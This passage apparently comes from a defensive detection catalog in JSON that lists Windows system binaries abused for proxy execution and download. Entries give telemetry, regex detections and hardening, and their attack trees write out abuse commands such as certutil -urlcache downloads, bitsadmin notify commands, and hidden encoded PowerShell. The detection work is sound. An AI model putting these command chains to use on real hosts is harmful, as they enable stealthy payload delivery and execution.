+                           "path":  "C:\\Windows\\System32\\cmstp.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "high",
+                           "abuse":  "Installs connection manager profiles from INF files and can execute commands from the profile.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create"
+                                         ],
+                           "detection":  "cmstp with /s, /ni or an INF file from temp. cmstp spawning cmd, powershell or rundll32.",
+                           "hardening":  [
+                                             "Block cmstp with WDAC or AppLocker if VPN profiles are not deployed through it.",
+                                             "Restrict INF execution from user-writable paths."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "archive -\u003e profile.inf",
+                                            "d":  "Sysmon 11",
+                                            "a":  "INF file with a malicious service section lands on disk"
+                                        },
+                                        {
+                                            "a":  "Installs a connection profile and runs the command in it",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218.003",
+                                            "c":  "cmstp.exe /s /ni C:\\Users\\Public\\example.inf",
+                                            "d":  "4688 + cmdline; Sysmon 1",
+                                            "p":  "cmstp.exe"
+                                        },
+                                        {
+                                            "t":  "T1059.003",
+                                            "s":  "Child process",
+                                            "p":  "cmstp.exe -\u003e cmd.exe",
+                                            "d":  "4688 parent=cmstp",
+                                            "a":  "INF RunPreSetupCommands executes"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "cmd.exe -\u003e 203.0.113.43:443",
+                                            "d":  "Sysmon 22",
+                                            "a":  "Staged command downloads"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "cmstp with /s and an INF from a user path is the known bypass shape.",
+                                       "m":  [
+                                                 "cmstp(\\.exe)?\\s+.*(/s|/ni)\\s+.*\\.inf",
+                                                 "ParentImage.*cmstp"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Egress from cmstp.exe or its immediate child is abnormal on a workstation.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Block cmstp.exe unless VPN profiles are provisioned centrally.",
+                                       "Alert on /s or /ni with a user-path INF.",
+                                       "Enable 4688 parent tracking.",
+                                       "Prefer centrally deployed VPN profiles."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218.008",
+                           "name":  "Odbcconf",
+                           "host":  "odbcconf.exe",
+                           "path":  "C:\\Windows\\System32\\odbcconf.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "medium",
+                           "abuse":  "Registers DLLs with /A {REGSVR} and can execute exported code.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             "Sysmon 7 image load"
+                                         ],
+                           "detection":  "odbcconf with /A {REGSVR} or DLL paths from temp. odbcconf spawning rundll32.",
+                           "hardening":  [
+                                             "Block odbcconf if ODBC setup is not performed on the host.",
+                                             "Restrict DLL load paths with WDAC."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "script -\u003e setup.rsp",
+                                            "d":  "Sysmon 11",
+                                            "a":  "Response file lands on disk"
+                                        },
+                                        {
+                                            "a":  "Runs REGSVR through a response file",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218.008",
+                                            "c":  "odbcconf.exe /a {REGSVR C:\\Users\\Public\\example.dll}",
+                                            "d":  "4688 + cmdline; Sysmon 1",
+                                            "p":  "odbcconf.exe"
+                                        },
+                                        {
+                                            "t":  "T1218.008",
+                                            "s":  "DLL load",
+                                            "p":  "odbcconf.exe -\u003e example.dll",
+                                            "d":  "Sysmon 7; 4688",
+                                            "a":  "Unsigned DLL loaded into the signed host"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "odbcconf.exe -\u003e 203.0.113.44:443",
+                                            "d":  "Sysmon 22",
+                                            "a":  "DLL beacons"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "odbcconf with /a or /f and REGSVR is the documented proxy-execution pattern.",
+                                       "m":  [
+                                                 "odbcconf(\\.exe)?\\s+.*(/a|/f)",
+                                                 "odbcconf(\\.exe)?\\s+.*REGSVR"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "odbcconf.exe has no reason to reach the internet; alert on any egress.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Remove odbcconf.exe where ODBC setup is not required.",
+                                       "Alert on /a and /f arguments.",
+                                       "Allow only signed DLLs through WDAC.",
+                                       "Track DLL loads with Sysmon 7."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218.014",
+                           "name":  "MMC",
+                           "host":  "mmc.exe",
+                           "path":  "C:\\Windows\\System32\\mmc.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "medium",
+                           "abuse":  "Loads Microsoft Management Console files and COM snap-ins.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create"
+                                         ],
+                           "detection":  "mmc loading an .msc file from temp or downloads. mmc spawning script hosts or cmd.",
+                           "hardening":  [
+                                             "Block unsigned .msc files with WDAC or AppLocker.",
+                                             "Restrict MMC snap-in execution to administrative accounts."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "archive -\u003e console.msc",
+                                            "d":  "Sysmon 11",
+                                            "a":  "Console file with an embedded snap-in or script"
+                                        },
+                                        {
+                                            "a":  "Loads a user-supplied console file",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218.014",
+                                            "c":  "mmc.exe C:\\Users\\Public\\console.msc",
+                                            "d":  "4688 + cmdline; Sysmon 1",
+                                            "p":  "mmc.exe"
+                                        },
+                                        {
+                                            "t":  "T1218.014",
+                                            "s":  "Script/snap-in",
+                                            "p":  "mmc.exe -\u003e script",
+                                            "d":  "AMSI; 4104",
+                                            "a":  "Snap-in or embedded script runs code"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "mmc.exe -\u003e 203.0.113.45:443",
+                                            "d":  "Sysmon 22",
+                                            "a":  "Snap-in performs network activity"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "A .msc outside the system management folder is the indicator.",
+                                       "m":  [
+                                                 "mmc(\\.exe)?\\s+.*\\\\\\\\(Temp|Users\\\\Public|Downloads)\\\\.*\\.msc",
+                                                 "mmc(\\.exe)?\\s+.*\\.msc"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Egress from mmc.exe is not normal; correlate with the console file path.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Restrict .msc execution to administrators.",
+                                       "Alert on console files in user-writable paths.",
+                                       "Enable 4688 cmdline.",
+                                       "Allow-list MMC snap-ins through AppLocker."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218",
+                           "name":  "Xwizard",
+                           "host":  "xwizard.exe",
+                           "path":  "C:\\Windows\\System32\\xwizard.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "medium",
+                           "abuse":  "Instantiates COM classes by CLSID and can proxy execution.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create"
+                                         ],
+                           "detection":  "xwizard with a CLSID argument, especially followed by child processes.",
+                           "hardening":  [
+                                             "Block xwizard with WDAC or AppLocker if it is not used.",
+                                             "Restrict COM class activation."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "archive -\u003e example.dll",
+                                            "d":  "Sysmon 11; 13",
+                                            "a":  "DLL plus a registration entry"
+                                        },
+                                        {
+                                            "a":  "Runs a registered wizard class from a DLL",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218",
+                                            "c":  "xwizard.exe RunWizard {00000000-0000-0000-0000-000000000000}",
+                                            "d":  "4688 + cmdline; Sysmon 1; 7",
+                                            "p":  "xwizard.exe"
+                                        },
+                                        {
+                                            "t":  "T1218",
+                                            "s":  "DLL load",
+                                            "p":  "xwizard.exe -\u003e example.dll",
+                                            "d":  "Sysmon 7; 13",
+                                            "a":  "Wizard class executes in the signed host"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "xwizard.exe -\u003e 203.0.113.46:443",
+                                            "d":  "Sysmon 22",
+                                            "a":  "Wizard code beacons"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "xwizard RunWizard with a class GUID is the proxy-execution signature.",
+                                       "m":  [
+                                                 "xwizard(\\.exe)?\\s+.*RunWizard",
+                                                 "xwizard(\\.exe)?\\s+.*\\{[0-9A-Fa-f-]{36}\\}"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Any xwizard.exe egress is abnormal.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Block xwizard.exe for standard users.",
+                                       "Alert on RunWizard and GUID arguments.",
+                                       "Monitor registry class registration (Sysmon 12/13).",
+                                       "WDAC allow-list for signed DLLs."
+                                   ]
+                       },
+                       {
+                           "id":  "T1202",
+                           "name":  "Forfiles",
+                           "host":  "forfiles.exe",
+                           "path":  "C:\\Windows\\System32\\forfiles.exe",
+                           "family":  "Indirect command execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Indirect command",
+                           "risk":  "medium",
+                           "abuse":  "Runs an arbitrary command through /c for each matching file.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create"
+                                         ],
+                           "detection":  "forfiles /c with powershell, cmd, wscript or mshta. forfiles used from a script host parent.",
+                           "hardening":  [
+                                             "Block forfiles if it is not required.",
+                                             "Enable command line auditing so the /c argument is visible."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "script -\u003e batch",
+                                            "d":  "Sysmon 11",
+                                            "a":  "A wrapper script is written"
+                                        },
+                                        {
+                                            "a":  "Indirect command execution through /c",
+                                            "s":  "Execution",
+                                            "t":  "T1202",
+                                            "c":  "forfiles.exe /p C:\\Windows /m *.log /c \"cmd /c ...\"",
+                                            "d":  "4688 + cmdline; Sysmon 1",
+                                            "p":  "forfiles.exe"
+                                        },
+                                        {
+                                            "t":  "T1059.003",
+                                            "s":  "Child process",
+                                            "p":  "forfiles.exe -\u003e cmd.exe",
+                                            "d":  "4688 parent=forfiles",
+                                            "a":  "The /c payload runs"
+                                        },
+                                        {
+                                            "t":  "T1105",
+                                            "s":  "Egress",
+                                            "p":  "cmd.exe -\u003e 203.0.113.47:80",
+                                            "d":  "Sysmon 22",
+                                            "a":  "Download the next stage"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "forfiles with /c is a known indirect-execution wrapper; normal use is rare.",
+                                       "m":  [
+                                                 "forfiles(\\.exe)?\\s+.*(/c|/p)"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block all Office applications from creating child processes",
+                                           "g":  "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Egress from forfiles.exe or its child on a workstation is suspicious.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Alert on forfiles with /c.",
+                                       "Block forfiles.exe through AppLocker where unused.",
+                                       "Enable parent-child process logging.",
+                                       "Segment egress so system binaries cannot reach the internet directly."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218",
+                           "name":  "Pcalua",
+                           "host":  "pcalua.exe",
+                           "path":  "C:\\Windows\\System32\\pcalua.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "medium",
+                           "abuse":  "Runs a program through the Program Compatibility Assistant with -a.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create"
+                                         ],
+                           "detection":  "pcalua -a with powershell, cmd or a binary from temp.",
+                           "hardening":  [
+                                             "Block pcalua with WDAC or AppLocker if it is not used.",
+                                             "Audit parent/child chains from pcalua."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "archive -\u003e example.exe",
+                                            "d":  "Sysmon 11",
+                                            "a":  "Program Compatibility Assistant target lands on disk"
+                                        },
+                                        {
+                                            "a":  "Runs an arbitrary binary via -a",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218",
+                                            "c":  "pcalua.exe -a C:\\Users\\Public\\example.exe",
+                                            "d":  "4688 + cmdline; Sysmon 1",
+                                            "p":  "pcalua.exe"
+                                        },
+                                        {
+                                            "t":  "T1204.002",
+                                            "s":  "Child process",
+                                            "p":  "pcalua.exe -\u003e example.exe",
+                                            "d":  "4688 parent=pcalua; Sysmon 1",
+                                            "a":  "The target executes"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "example.exe -\u003e 203.0.113.48:443",
+                                            "d":  "Sysmon 22",
+                                            "a":  "Payload beacons"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "pcalua -a pointing at a user-path executable is the documented pattern.",
+                                       "m":  [
+                                                 "pcalua(\\.exe)?\\s+.*-a\\s+",
+                                                 "ParentImage.*pcalua"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Egress from pcalua.exe children is abnormal; keep the parent link.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Alert on pcalua with -a.",
+                                       "Block pcalua.exe where compatibility troubleshooting is not needed.",
+                                       "Log 4688 child process with parent.",
+                                       "Apply WDAC to user-writable paths."
+                                   ]
+                       },
+                       {
+                           "id":  "T1140",
+                           "name":  "Certutil",
+                           "host":  "certutil.exe",
+                           "path":  "C:\\Windows\\System32\\certutil.exe",
+                           "family":  "Deobfuscate or decode files",
+                           "platform":  "windows",
+                           "group":  "Download and Decode",
+                           "method":  "Decoder",
+                           "risk":  "high",
+                           "abuse":  "Downloads files with -urlcache and decodes base64 content with -decode.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             "Sysmon 3/22 network",
+                                             "Sysmon 11 file create"
+                                         ],
+                           "detection":  "certutil -urlcache -split -f, -decode, -encode or -verifyctl with remote URLs. Files written to temp or startup paths.",
+                           "hardening":  [
+                                             "Block certutil with WDAC or AppLocker if certificate tooling is not needed.",
+                                             "Apply egress filtering and alert on system binaries making HTTP requests."
+                                         ],
+                           "needs":  [
+                                         "process",
+                                         "network"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "phish/script -\u003e command",
+                                            "d":  "4688 cmdline; 4104",
+                                            "a":  "Operator or script composes the certutil line"
+                                        },
+                                        {
+                                            "a":  "Downloads a file with -urlcache -split -f",
+                                            "s":  "Ingress tool transfer",
+                                            "t":  "T1105",
+                                            "c":  "certutil.exe -urlcache -split -f https://example.com/sample.txt %TEMP%\\sample.txt",
+                                            "d":  "4688 + cmdline; Sysmon 1",
+                                            "p":  "certutil.exe"
+                                        },
+                                        {
+                                            "a":  "Decodes a base64 blob with -decode",
+                                            "s":  "Deobfuscate",
+                                            "t":  "T1140",
+                                            "c":  "certutil.exe -decode encoded.txt payload.bin",
+                                            "d":  "4688 + cmdline",
+                                            "p":  "certutil.exe"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "certutil.exe -\u003e 203.0.113.50:443",
+                                            "d":  "Sysmon 3/22; 5156; proxy",
+                                            "a":  "HTTP(S) transfer from a certificate utility"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "certutil should not download URLs or decode arbitrary blobs in normal certificate operations. This is the highest-value single match in the catalog.",
+                                       "m":  [
+                                                 "certutil(\\.exe)?\\s+.*-urlcache",
+                                                 "certutil(\\.exe)?\\s+.*-(split|verifyctl|decode|encode)",
+                                                 "certutil(\\.exe)?\\s+.*https?://"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Primary network control: alert on certutil.exe opening 80/443 to any host that is not a known certificate or update endpoint, then capture bytes out. Correlate with the -urlcache cmdline.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Alert on certutil with -urlcache, -split, -decode or a URL.",
+                                       "Watch certutil.exe egress and block it at the firewall outside update windows.",
+                                       "Restrict outbound 80/443 to a proxy that logs the user agent and URL.",
+                                       "Enable 4688 cmdline and Sysmon 3/22 to join the process to the flow."
+                                   ]
+                       },
+                       {
+                           "id":  "T1197",
+                           "name":  "BITS Jobs",
+                           "host":  "bitsadmin.exe",
+                           "path":  "C:\\Windows\\System32\\bitsadmin.exe",
+                           "family":  "BITS jobs",
+                           "platform":  "windows",
+                           "group":  "Download and Decode",
+                           "method":  "Background transfer",
+                           "risk":  "high",
+                           "abuse":  "Transfers files and can attach a notify command line that runs after the transfer.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             "Sysmon 3/22 network",
+                                             "BITS client operational log"
+                                         ],
+                           "detection":  "bitsadmin /transfer, /addfile, /SetNotifyCmdLine or jobs that outlive their parent. BITS transfers from system binaries.",
+                           "hardening":  [
+                                             "Monitor the BITS client operational log.",
+                                             "Restrict BITS jobs to approved applications with WDAC or AppLocker."
+                                         ],
+                           "needs":  [
+                                         "process",
+                                         "network"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "script -\u003e command",
+                                            "d":  "4688 cmdline",
+                                            "a":  "Operator builds a BITS job"
+                                        },
+                                        {
+                                            "a":  "Creates and starts a transfer job",
+                                            "s":  "BITS job",
+                                            "t":  "T1197",
+                                            "c":  "bitsadmin.exe /transfer job /download /priority normal https://example.com/sample.zip %TEMP%\\sample.zip",
+                                            "d":  "4688 + cmdline; BITS-Client log; Sysmon 1",
+                                            "p":  "bitsadmin.exe"
+                                        },
+                                        {
+                                            "a":  "Sets a command to run when the job completes",
+                                            "s":  "Notify command",
+                                            "t":  "T1197",
+                                            "c":  "bitsadmin.exe /SetNotifyCmdLine job \"cmd.exe\" \"/c ...\"",
+                                            "d":  "4688; BITS-Client 59",
+                                            "p":  "bitsadmin.exe -\u003e cmd.exe"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "svchost.exe (BITS) -\u003e 203.0.113.51:443",
+                                            "d":  "Sysmon 3/22 on svchost; proxy logs",
+                                            "a":  "Transfer runs inside the BITS service, not bitsadmin.exe"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "BITS jobs can survive reboot and run a notify command. The command line is the reliable detection point because the transfer itself runs in svchost.exe.",
+                                       "m":  [
+                                                 "bitsadmin(\\.exe)?\\s+/transfer",
+                                                 "bitsadmin(\\.exe)?\\s+/SetNotifyCmdLine",
+                                                 "bitsadmin(\\.exe)?\\s+/AddFile",
+                                                 "bitsadmin(\\.exe)?\\s+/SetMinRetryDelay"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "BITS transfers appear as svchost.exe egress, so process-name egress rules alone will miss them. Join BITS-Client job events (job created, URL) to the svchost flow, or block BITS to unknown hosts at the proxy.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Alert on bitsadmin /transfer and /SetNotifyCmdLine.",
+                                       "Enable the BITS-Client operational log and forward it.",
+                                       "Proxy BITS traffic so destinations are visible.",
+                                       "Remove completed and queued jobs you did not create; never delete jobs blindly."
+                                   ]
+                       },
+                       {
+                           "id":  "T1059.001",
+                           "name":  "PowerShell",
+                           "host":  "powershell.exe",
+                           "path":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                           "family":  "Command and scripting interpreter",
+                           "platform":  "windows",
+                           "group":  "Script Hosts",
+                           "method":  "Interpreter",
+                           "risk":  "high",
+                           "abuse":  "Runs encoded, hidden or downloaded commands and can load assemblies in memory.",
+                           "probe":  "Optional inert marker probe.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             "4104 script block logging",
+                                             "4103 module logging",
+                                             "Transcription files"
+                                         ],
+                           "detection":  "powershell -enc, -nop, -w hidden, IEX, DownloadString, FromBase64String or AMSI bypass strings. PowerShell children of Office, browsers or script hosts.",
+                           "hardening":  [
+                                             "Enable script block logging and transcription.",
+                                             "Enable ASR rules for script and Office child processes.",
+                                             "Use Constrained Language Mode and WDAC for high-risk users."
+                                         ],
+                           "needs":  [
+                                         "process",
+                                         "content"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "scriptblock",
+                                            "amsi",
+                                            "applocker",
+                                            "wdac",
+                                            "asr"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "document/script",
+                                            "d":  "4688 parent; Sysmon 1",
+                                            "a":  "Macro or HTA composes a PowerShell line"
+                                        },
+                                        {
+                                            "a":  "Runs a hidden, encoded or download-and-execute command",
+                                            "s":  "Execution",
+                                            "t":  "T1059.001",
+                                            "c":  "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand \u003cbase64\u003e",
+                                            "d":  "4104; 4103; AMSI; 4688",
+                                            "p":  "powershell.exe"
+                                        },
+                                        {
+                                            "t":  "T1105",
+                                            "s":  "Ingress tool transfer",
+                                            "p":  "powershell.exe -\u003e 203.0.113.60:443",
+                                            "d":  "Sysmon 22; 4104 script text",
+                                            "a":  "Download cradle or module fetch"
+                                        },
+                                        {
+                                            "t":  "T1562.001",
+                                            "s":  "Defense evasion",
+                                            "p":  "powershell.exe -\u003e security service",
+                                            "d":  "4688; 4104; Defender 5007",
+                                            "a":  "Attempt to weaken a protection (should be blocked, not just logged)"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "The detector that matters is content (4104/AMSI), not just the command line. Alert on hidden plus encoded plus a download verb in the same block.",
+                                       "m":  [
+                                                 "powershell(\\.exe)?\\s+.*-enc(odedcommand)?\\s+",
+                                                 "powershell(\\.exe)?\\s+.*-w(indowstyle)?\\s+hidden",
+                                                 "powershell(\\.exe)?\\s+.*(IEX|Invoke-Expression|DownloadString|FromBase64String)",
+                                                 "ParentImage.*(winword|excel|outlook|mshta|wscript)"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block execution of potentially obfuscated scripts",
+                                           "g":  "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC"
+                                       },
+                                       {
+                                           "n":  "Block all Office applications from creating child processes",
+                                           "g":  "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Track powershell.exe egress by destination and frequency; baseline admin tooling so a new destination stands out.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Enable script block logging (4104) and AMSI output.",
+                                       "Enable the ASR obfuscated-script rule in block mode.",
+                                       "Constrain Language Mode or use WDAC for PowerShell.",
+                                       "Alert on hidden plus encoded arguments from an Office parent."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218.001",
+                           "name":  "Compiled HTML Help",
+                           "host":  "hh.exe",
+                           "path":  "C:\\Windows\\System32\\hh.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "medium",
+                           "abuse":  "Opens CHM files, which can launch embedded content.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create"
+                                         ],
+                           "detection":  "hh.exe opening .chm files from temp, downloads or email attachments. hh.exe spawning cmd or powershell.",
+                           "hardening":  [
+                                             "Block CHM files from untrusted zones with Attachment Manager.",
+                                             "Block hh.exe with WDAC or AppLocker if help files are not used."
+                                         ],
+                           "needs":  [
+                                         "process",
+                                         "content"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "archive -\u003e help.chm",
+                                            "d":  "Sysmon 11",
+                                            "a":  "Compiled help file arrives"
+                                        },
+                                        {
+                                            "a":  "Opens a CHM that runs embedded HTML/script",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218.001",
+                                            "c":  "hh.exe C:\\Users\\Public\\help.chm",
+                                            "d":  "4688 + cmdline; Sysmon 1",
+                                            "p":  "hh.exe"
+                                        },
+                                        {
+                                            "t":  "T1059.003",
+                                            "s":  "Child process",
+                                            "p":  "hh.exe -\u003e cmd.exe",
+                                            "d":  "4688 parent=hh; Sysmon 1",
+                                            "a":  "CHM topic launches a command"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "hh.exe -\u003e 203.0.113.61:80",
+                                            "d":  "Sysmon 22",
+                                            "a":  "Remote content fetched"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "A CHM from a user-writable path, especially with a child process, is the abuse shape.",
+                                       "m":  [
+                                                 "hh(\\.exe)?\\s+.*\\\\(Temp|Users\\\\Public|Downloads)\\\\.*\\.chm",
+                                                 "ParentImage.*hh\\.exe"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "hh.exe egress is abnormal on a workstation.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Remove the .chm association for standard users.",
+                                       "Alert on hh.exe with a user-path CHM.",
+                                       "Block child processes from hh.exe via ASR if available.",
+                                       "Log 4688 parent-child chains."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218.009",
+                           "name":  "Regasm and Regsvcs",
+                           "host":  "regasm.exe",
+                           "path":  "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "medium",
+                           "abuse":  "Registers .NET assemblies and can run code during registration.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create"
+                                         ],
